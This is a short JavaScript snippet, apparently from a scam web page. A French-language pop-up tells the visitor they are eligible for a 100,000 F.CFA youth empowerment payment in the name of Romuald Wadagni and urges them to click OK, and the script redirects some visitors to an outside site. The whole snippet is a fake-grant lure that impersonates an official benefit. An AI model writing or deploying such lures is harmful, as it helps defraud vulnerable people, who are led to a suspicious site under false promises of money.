var password = '100,000 F.CFA';

password = prompt(
  'Félicitations, vous êtes éligible pour recevoir le soutien financier d’autonomisation des jeunes de 100,000 F.CFA ROMUALD WADAGNI. Cliquez sur OK pour recevoir instantanément.',
  '100,000 F.CFA'
);

if (password !== '100,000 F.CFA') {
    location.href = 'https://www.utereino.site/soutenir-les-jeunes';
}
